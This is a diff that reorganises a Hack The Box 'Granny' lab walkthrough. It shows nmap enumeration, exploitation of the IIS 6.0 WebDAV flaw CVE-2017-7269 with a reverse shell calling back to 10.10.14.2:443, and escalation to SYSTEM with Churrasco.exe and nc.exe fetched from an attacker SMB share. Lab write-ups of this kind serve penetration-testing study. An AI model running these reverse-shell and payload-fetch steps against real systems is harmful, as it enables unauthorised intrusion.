@@ -1,3 +1,4 @@
+
 # HTB - Granny
 
 **IP Address:** `10.10.10.15`  
@@ -29,6 +30,9 @@ Exploitation leads to an initial shell as a low-privileged user. Privilege escal
 
 ### 1.1 Connectivity Test
 
+Check if the host is alive using ICMP:
+
+
 We begin by checking if the target is alive with ICMP:
 
 ```bash
@@ -41,6 +45,9 @@ The machine responds, confirming it is alive.
 
 ---
 ### 1.2 Port Scanning
+
+Scan all TCP ports to identify open services:
+
 
 We scan all 65,535 TCP ports to identify open services:
 
@@ -63,6 +70,9 @@ Only port **80/tcp** is open.
 ---
 ### 1.3 Targeted Scan
 
+Run a deeper scan on the identified ports with version detection and default scripts:
+
+
 We run a deeper scan with version detection and default NSE scripts:
 
 ```bash
@@ -80,7 +90,20 @@ nmap -p80 -sC -sV 10.10.10.15 -oN targeted
 The service runs **IIS 6.0 WebDAV**, an outdated version known to be vulnerable.
 
 ---
-## 2. Exploitation – IIS 6.0 WebDAV Buffer Overflow
+## 2. Service Enumeration
+
+### 2.1 IIS HTTP surface
+
+Confirm the web server responds on port 80:
+
+```bash
+curl -i http://10.10.10.15/
+```
+
+---
+## 3. Foothold
+
+### 3.1 IIS 6.0 WebDAV buffer overflow (CVE-2017-7269)
 
 During the targeted scan we identify **WebDAV**, a set of HTTP extensions that allows collaborative editing and file management. IIS 6.0 is known to be vulnerable to **CVE-2017-7269**.
 
@@ -116,9 +139,13 @@ python2 iis6\ reverse\ shell 10.10.10.15 80 10.10.14.2 443
 ✅ Reverse shell obtained.
 
 ---
-## 3. Post-Exploitation Enumeration
+### 3.2 Post-exploitation enumeration
 
 We check our privileges and system structure:
+
+```powershell
+whoami
+```
 
 ![whoami](screenshots/whoami.png)
 
@@ -133,7 +160,9 @@ Checking privileges:
 We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege escalation.
 
 ---
-## 4. Privilege Escalation – Churrasco.exe
+## 4. Privilege Escalation
+
+### 4.1 Churrasco.exe (`SeImpersonatePrivilege`)
 
 Normally, **JuicyPotato** would be used, but it does not support Windows Server 2003 due to missing CLSIDs. 
 
@@ -181,10 +210,13 @@ copy "\\10.10.14.2\smb\nc.exe" nc.exe
 
 ✅ Privilege escalation successful – we are `NT AUTHORITY\SYSTEM`.
 
----
-## 5. Flags
+### 4.2 Flags
 
 With SYSTEM access, we can retrieve both flags:
+
+```powershell
+dir C:\Documents and Settings\Administrator\Desktop
+```
 
 ![root_user_flag](screenshots/root_user_flag.png)
 
